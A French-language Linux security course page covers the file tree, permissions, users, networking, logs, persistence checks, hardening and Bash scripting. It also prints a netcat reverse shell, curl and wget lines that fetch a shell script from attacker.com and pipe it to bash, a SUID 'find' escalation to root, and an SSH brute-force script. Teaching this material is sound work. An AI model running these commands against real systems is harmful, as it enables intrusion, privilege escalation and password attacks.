// 01 · Architecture

Architecture & Arborescence Linux

📂 L'ARBORESCENCE — TOUT PART DE /
/  ← racine du système
├── /etc  ← configs système (passwd, ssh, cron)
├── /var/log  ← tous les logs
├── /tmp  ← temporaire, souvent exploité
├── /home  ← dossiers utilisateurs
├── /root  ← home du superuser root
├── /bin  ← commandes essentielles
├── /usr/bin  ← programmes installés
├── /proc  ← processus en cours (virtuel)
└── /dev  ← périphériques (disques, terminaux)
🔑 FICHIERS CRITIQUES À CONNAÎTRE
/etc/passwdListe de tous les utilisateurs
/etc/shadowMots de passe hashés (root only)
/etc/sudoersQui peut faire sudo ?
/etc/crontabTâches planifiées automatiques
/etc/hostsRésolution DNS locale
~/.bash_historyHistorique des commandes !
~/.ssh/Clés SSH privées (trésor)
// 02 · Navigation & Fichiers

Les commandes fondamentales

ls -la
Lister tous les fichiers, y compris cachés (commençant par .) avec permissions
$ ls -la /etc/ → voir configs + droits
cat / less / tail
Lire le contenu d'un fichier. tail -f pour suivre un log en temps réel
$ tail -f /var/log/auth.log
find
Chercher des fichiers par nom, taille, permissions, date. Indispensable en forensics et pentest
$ find / -perm -4000 2>/dev/null
grep
Chercher un pattern dans un fichier ou flux. -r récursif, -i insensible à la casse
$ grep -r "password" /etc/
chmod / chown
Modifier permissions et propriétaire d'un fichier. Critique pour l'escalade de privilèges
$ chmod 600 ~/.ssh/id_rsa
ps / top / htop
Voir les processus en cours. Détecter des processus malveillants ou inattendus
$ ps aux | grep suspicious
history
Afficher les commandes précédentes. En forensics : mine d'or sur une machine compromise
$ cat ~/.bash_history | grep pass
sudo / su
Exécuter en tant que root. sudo -l : voir ce qu'on peut faire → escalade de privilèges
$ sudo -l → GTFOBins exploitation
// 03 · Permissions

Le système de permissions Linux

LIRE UNE PERMISSION
$ ls -la /etc/passwd
-rw-r--r-- 1 root root 2847 jan 15 /etc/passwd

# Décomposition :
-rw-r--r--
# type | proprio | groupe | autres
r = 4 — lire (read)
w = 2 — écrire (write)
x = 1 — exécuter (execute)
rwx = 7  rw- = 6  r-- = 4
⚔️ SUID — LE PIÈGE DES PENTESTERS
Un fichier avec le bit SUID (s) s'exécute avec les droits de son propriétaire — souvent root. C'est une voie royale pour l'escalade de privilèges.
# Trouver tous les SUID
$ find / -perm -4000 2>/dev/null

# Exemple dangereux
-rwsr-xr-x root root /usr/bin/find
# → find a le SUID → GTFOBins!

$ find . -exec /bin/bash -p \; # root!
💡 GTFOBins.github.io — référence de toutes les escalades via SUID
// 04 · Utilisateurs

Gestion des utilisateurs & groupes

👤 COMMANDES UTILISATEURS
# Voir tous les utilisateurs
$ cat /etc/passwd

# Qui suis-je ?
$ whoami && id

# Créer un utilisateur
root@soopha# useradd -m -s /bin/bash beni
root@soopha# passwd beni

# Ajouter au groupe sudo
root@soopha# usermod -aG sudo beni

# Voir les connexions actives
$ who && last | head -20
🔑 /etc/passwd — DÉCODER LA STRUCTURE
# Format : user:x:uid:gid:info:home:shell
root:x:0:0:root:/root:/bin/bash
beni:x:1001:1001::/home/beni:/bin/bash
www-data:x:33:33::/var/www:/usr/sbin/nologin
⚠️ COMPTES À RISQUE
  • Comptes avec UID 0 = root, très dangereux si multiples
  • Shell /bin/bash sur comptes de service = risque
  • /etc/shadow — si lisible par un user normal → grave
  • Comptes sans mot de passe dans /etc/shadow
// 05 · Réseau

Réseau sous Linux — Commandes essentielles

🌐 DIAGNOSTIC RÉSEAU
# Voir mes interfaces et IPs
$ ip a    # moderne
$ ifconfig  # ancien

# Connexions actives — qui écoute quoi
$ ss -tulnp
$ netstat -tulnp  # ancien

# Table de routage
$ ip route

# DNS — résolution
$ cat /etc/resolv.conf
$ nslookup soopha-learn.com

# Tracer le chemin vers un hôte
$ traceroute google.com
⚔️ COMMANDES OFFENSIVES
# Scanner un réseau (Nmap)
$ nmap -sV 192.168.1.0/24

# Connexion netcat (reverse shell)
$ nc -lvnp 4444  # écouter
$ nc 192.168.1.1 4444 -e /bin/bash

# Tunnel SSH (port forwarding)
$ ssh -L 8080:localhost:80 user@cible

# Télécharger silencieusement
$ wget -q http://attacker.com/shell.sh
$ curl -s http://attacker.com/shell.sh | bash
⚠️ Ces commandes ne sont légales que dans un cadre autorisé.
// 06 · Logs

Logs Linux — La mémoire du système

📋 LES LOGS ESSENTIELS
/var/log/auth.logConnexions SSH, sudo, logins
/var/log/syslogÉvénements système généraux
/var/log/kern.logMessages du noyau Linux
/var/log/apache2/Accès et erreurs web
/var/log/nginx/Accès et erreurs Nginx
/var/log/cronTâches planifiées exécutées
/var/log/btmpTentatives de connexion échouées
🔍 ANALYSER LES LOGS COMME UN PRO
# Connexions SSH échouées
$ grep "Failed password" /var/log/auth.log

# Qui s'est connecté en root ?
$ grep "session opened for root" /var/log/auth.log

# Top des IPs qui attaquent
$ grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Voir les logs système live
$ journalctl -f
$ journalctl -u ssh --since today
💡 Un attaquant efface souvent les logs. Vérifier si /var/log/auth.log est vide = signe d'intrusion.
// 07 · Processus & Services

Processus, services & persistance

⚙️ SURVEILLER LES PROCESSUS
# Voir tous les processus
$ ps aux
$ ps aux | grep nc  # chercher netcat

# Processus avec ports ouverts
$ ss -tulnp

# Tuer un processus
$ kill -9 [PID]

# Processus en temps réel
$ top   # ou htop (plus lisible)

# Arbre des processus
$ pstree -p
🔴 MÉCANISMES DE PERSISTANCE
Un attaquant qui s'est introduit cherche à rester présent même après un redémarrage.
# Cron — tâches planifiées
$ crontab -l  # mon cron
$ cat /etc/crontab
$ ls /etc/cron.d/

# Services systemd
$ systemctl list-units --type=service
$ systemctl status suspicious.service

# .bashrc / .profile — backdoor
$ cat ~/.bashrc | grep -v "#"
⚠️ Vérifier ces emplacements lors d'un audit post-incident.
// 08 · Hardening

Hardening Linux — Durcir un serveur

🛡️ CHECKLIST SÉCURITÉ
01
SSH renforcé — désactiver root login, forcer les clés SSH, changer le port
PermitRootLogin no · PasswordAuthentication no
02
Firewall UFW — bloquer tout entrant sauf ce qui est nécessaire
ufw default deny incoming · ufw allow 22/tcp
03
Mises à jour automatiques — patcher les failles connues
apt install unattended-upgrades
04
Fail2ban — bloquer les IPs après X tentatives SSH échouées
maxretry = 3 · bantime = 3600
05
Principe du moindre privilège — pas de sudo pour tous
visudo → restreindre les commandes autorisées
⚙️ COMMANDES HARDENING
# Firewall UFW
root# ufw enable
root# ufw default deny incoming
root# ufw allow ssh
root# ufw allow 443/tcp

# Forcer SSH par clés
root# nano /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
root# systemctl restart sshd

# Vérifier les SUID suspects
root# find / -perm -4000 -ls 2>/dev/null

// 09 · Bash Scripting

Bash — Automatiser la cybersécurité

⚡ STRUCTURE D'UN SCRIPT BASH
#!/bin/bash # shebang obligatoire

# Variable
TARGET="192.168.1.1"

# Condition
if ping -c1 $TARGET &>/dev/null; then
  echo "Host UP"
else
  echo "Host DOWN"
fi

# Boucle sur un sous-réseau
for i in {1..254}; do
  ping -c1 -W1 192.168.1.$i &>/dev/null && echo "UP: 192.168.1.$i"
done
🔬 SCRIPTS UTILES EN CYBER
#!/bin/bash — Scanner SSH brute-force simple
WORDLIST="/usr/share/wordlists/rockyou.txt"
TARGET="192.168.1.10"
USER="admin"
while IFS= read -r pass; do
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $USER@$TARGET exit 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "✅ FOUND: $pass"; exit
  fi
done < $WORDLIST
⚠️ Uniquement sur des systèmes dont vous êtes propriétaire ou avec autorisation.
